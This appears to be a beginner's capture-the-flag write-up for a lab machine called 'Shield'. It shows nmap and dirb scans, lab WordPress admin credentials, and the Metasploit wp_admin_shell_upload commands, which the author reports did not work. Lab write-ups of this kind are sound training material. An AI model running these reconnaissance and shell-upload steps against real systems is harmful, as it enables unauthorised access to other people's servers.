# Shield

## `nmap 10.10.10.29 -sV -sC`

    vagrant@vagrant-virtualbox ~> nmap 10.10.10.29 -sV -sC
    Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-02 12:30 CDT
    Nmap scan report for 10.10.10.29
    Host is up (0.031s latency).
    Not shown: 998 filtered ports
    PORT     STATE SERVICE VERSION
    80/tcp   open  http    Microsoft IIS httpd 10.0
    | http-methods: 
    |_  Potentially risky methods: TRACE
    |_http-server-header: Microsoft-IIS/10.0
    |_http-title: IIS Windows Server
    3306/tcp open  mysql   MySQL (unauthorized)
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 11.69 seconds

HTTP and MySQL.

## HTTP

Looks like IIS default page. Running `dirb`.

Apparently it runs wordpress.

Also, even though `admin` is a user on the site, `admin:qwerty789` does not work as a login.

Going to wait for `dirb` to finish. Or search metasploit database for `xmlrpc.php` payloads.

- <http://10.10.10.29/wordpress/>
- <http://10.10.10.29/wordpress/wp-login.php?redirect_to=http%3A%2F%2F10.10.10.29%2Fwordpress%2Fwp-admin%2F&reauth=1>

### dirb results

    vagrant@vagrant-virtualbox ~ [SIGINT]> dirb http://10.10.10.29

    -----------------
    DIRB v2.22    
    By The Dark Raver
    -----------------

    START_TIME: Sun May  2 12:41:43 2021
    URL_BASE: http://10.10.10.29/
    WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

    -----------------

    GENERATED WORDS: 4612                                                          

    ---- Scanning URL: http://10.10.10.29/ ----
    ==> DIRECTORY: http://10.10.10.29/wordpress/                                   
                                                                                
    ---- Entering directory: http://10.10.10.29/wordpress/ ----
    + http://10.10.10.29/wordpress/index.php (CODE:301|SIZE:0)                     
    ==> DIRECTORY: http://10.10.10.29/wordpress/wp-admin/                          
    ==> DIRECTORY: http://10.10.10.29/wordpress/wp-content/                        
    ==> DIRECTORY: http://10.10.10.29/wordpress/wp-includes/                       
    + http://10.10.10.29/wordpress/xmlrpc.php (CODE:405|SIZE:42)                   
                                                                                
    ---- Entering directory: http://10.10.10.29/wordpress/wp-admin/ ----
    + http://10.10.10.29/wordpress/wp-admin/admin.php (CODE:302|SIZE:0)            
    ==> DIRECTORY: http://10.10.10.29/wordpress/wp-admin/css/                      
    ==> DIRECTORY: http://10.10.10.29/wordpress/wp-admin/images/                   
    ==> DIRECTORY: http://10.10.10.29/wordpress/wp-admin/Images/                   
    ==> DIRECTORY: http://10.10.10.29/wordpress/wp-admin/includes/                 
    + http://10.10.10.29/wordpress/wp-admin/index.php (CODE:302|SIZE:0)            
    ==> DIRECTORY: http://10.10.10.29/wordpress/wp-admin/js/                       
    ==> DIRECTORY: http://10.10.10.29/wordpress/wp-admin/maint/                    
    ==> DIRECTORY: http://10.10.10.29/wordpress/wp-admin/network/                  
    ==> DIRECTORY: http://10.10.10.29/wordpress/wp-admin/user/                     
                                                                                
    ---- Entering directory: http://10.10.10.29/wordpress/wp-content/ ----
    + http://10.10.10.29/wordpress/wp-content/index.php (CODE:200|SIZE:0)          
    ==> DIRECTORY: http://10.10.10.29/wordpress/wp-content/plugins/                
    ==> DIRECTORY: http://10.10.10.29/wordpress/wp-content/themes/                 
    ==> DIRECTORY: http://10.10.10.29/wordpress/wp-content/Themes/                 
    ==> DIRECTORY: http://10.10.10.29/wordpress/wp-content/upgrade/                
    ==> DIRECTORY: http://10.10.10.29/wordpress/wp-content/uploads/                

## MySQL

Not sure if this is the vector to pursue. The logins I found from previous boxes aren't working.

## Cheaty McCheaterFace

In the interest of time, I'm going to just view the guide for this one since it's not really obvious to me, and I'm just starting to do these challenges.

I'm an idiot. I used the wrong password - I was supposed to use `admin:P@s5w0rd!`.

<http://10.10.10.29/wordpress/wp-login.php?redirect_to=http%3A%2F%2F10.10.10.29%2Fwordpress%2Fwp-admin%2F&reauth=1>

Next step is to use a Metasploit module from Wordpress.

I went back to the guide for this one, since I wouldn't have found it on my own, and it's `wp_admin_shell_upload`.

    msfconsole
    use wp_admin_shell_upload
    set PASSWORD P@s5w0rd!
    set USERNAME admin
    set TARGETURI /wordpress
    set RHOSTS 10.10.10.29
    run

Not working. Will come back to this later.